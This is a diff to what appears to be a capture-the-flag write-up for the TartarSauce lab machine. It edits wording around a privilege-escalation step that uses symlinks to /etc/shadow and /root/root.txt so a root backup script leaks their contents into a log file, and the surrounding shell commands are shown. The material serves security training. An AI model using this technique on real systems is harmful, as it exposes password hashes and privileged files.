@@ -759,7 +759,7 @@ Script analysis
 > 11) Otherwise log all differences to the log file
 
 Attack
-> A) under _www-data_ user create empty files under _/var/www/html_ 
+> A) with _www-data_ user create empty files under _/var/www/html_ 
 ```
 www-data@TartarSauce:/var/www/html$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -767,7 +767,7 @@ www-data@TartarSauce:/var/www/html$ touch 1
 www-data@TartarSauce:/var/www/html$ touch 2
 www-data@TartarSauce:/var/www/html$
 ```
-> B) under _onuma_ user create _var/www/html/_ structure under /var/tmp and symlink _/etc/shadow_ to _1_ and _/root/root.txt_ to _2_
+> B) with _onuma_ user create _var/www/html/_ structure under /var/tmp and symlink _/etc/shadow_ to _1_ and _/root/root.txt_ to _2_
 ```
 $ cd /var/tmp
 $ pwd
@@ -806,6 +806,7 @@ drwxr-xr-x  3 onuma onuma     4096 Nov 20 10:36 var
 $ cp a.tgz .e21b7e8063b4e508e808ff136821ad237a787c86
 ```
 > E) wait for the check to complete
+
 > F) check the log file _onuma_backup_error.txt_ under _/var/backups_ as it will contain differences between files _1_ and _2_ from _/var/www/html_ and a.tgz archive, i.e. contents of _/etc/shadow_ and _/root/root.txt_
 ```
 $ cat /var/backups/onuma_backup_error.txt
